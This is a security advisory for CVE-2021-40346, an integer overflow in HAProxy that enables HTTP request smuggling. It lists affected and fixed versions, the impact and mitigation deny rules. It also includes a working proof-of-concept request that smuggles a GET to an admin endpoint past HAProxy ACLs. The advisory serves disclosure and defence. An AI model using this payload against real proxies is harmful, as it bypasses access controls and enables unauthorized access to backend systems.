---
description: CVE-2021-40346 High severity. An integer overflow in HAProxy leads to HTTP Smuggling via simple network requests
title: Integer overflow in HAProxy leads to HTTP Smuggling
date_published: "2021-07-09"
last_updated: "2021-07-09"
xray_id: XRAY-184496
vul_id: CVE-2021-40346
cvss: 7.5
severity: high
discovered_by: Ori Hollander
type: vulnerability
---
## Summary

An integer overflow in HAProxy leads to HTTP Smuggling via simple network requests

## Component

[HAProxy](http://www.haproxy.org/)

## Affected versions

HAProxy [2.0 - 2.0.24], fixed in 2.0.25
HAProxy [2.1 - 2.1*], no fix. unmaintained version
HAProxy [2.2 - 2.2.16], fixed in 2.2.17
HAProxy [2.3 - 2.3.13], fixed in 2.3.14
HAProxy [2.4 - 2.4.3], fixed in 2.4.4
HAProxy Enterprise [2.0r1 - 2.0r1-1.0.0-234.1215], fixed in 2.0r1-1.0.0-235.1230
HAProxy Enterprise [2.1r1 - 2.1r1-1.0.0-238.612], fixed in 2.1r1-1.0.0-238.625
HAProxy Enterprise [2.2r1 - 2.2r1-1.0.0-241.491], fixed in 2.2r1-1.0.0-241.505
HAProxy Enterprise [2.3r1 - 2.3r1-1.0.0-242.330], fixed in 2.3r1-1.0.0-242.345
HAProxy Enterprise [2.4r1 - 2.4r1], fixed in 2.4r1-1.0.0-253.271
HAproxy Kubernetes Ingress Controller [1.6 - 1.6.6], fixed in 1.6.7
HAproxy Enterprise Kubernetes Ingress Controller [1.6 - 1.6.6], fixed in 1.6.7
HAProxy ALOHA [11.5 - 11.5.12], fixed in 11.5.13
HAProxy ALOHA [12.5 - 12.5.4], fixed in 12.5.5
HAProxy ALOHA [13.0 - 13.0.6], fixed in 13.0.7

## Description

Due to an integer overflow, a parsing error is created in HAProxy that allows an attacker to specify two `Content-Length` headers with different sizes. Subsequently, this allows an attacker to perform HTTP smuggling. This attack allows an adversary to smuggle HTTP requests to the backend server, without the proxy server being aware of it. The smuggled requests have various impacts, depending on HAProxy’s configuration and the backend web server configuration: Bypassing security controls, including any ACLs defined in HAProxy, Gaining unauthorized access to sensitive data, Executing unauthorized commands or modifying data, Hijacking user sessions, Exploiting a reflected XSS vulnerability without user interaction.

## PoC

Any attacker that can send requests through the proxy, can exploit this vulnerability, by sending requests such as:

```
POST /index.html HTTP/1.1
Host: abc.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 60

GET /admin/add_user.py HTTP/1.1
Host: abc.com
abc: xyz


```

The GET request will be smuggled and will evade any ACLs defined in the HAProxy configuration file.

## Vulnerability Mitigations

If you are not able to update right away, you can apply the following rules to your HAProxy configuration file to mitigate the vulnerabilities. These should be added to your frontend.

```
frontend myfrontend
http-request deny if { req.hdr_cnt(content-length) gt 1 }
http-response deny if { res.hdr_cnt(content-length) gt 1 }
```


## References

[(JFrog) Critical vulnerability in HAProxy ](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/)

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-40346)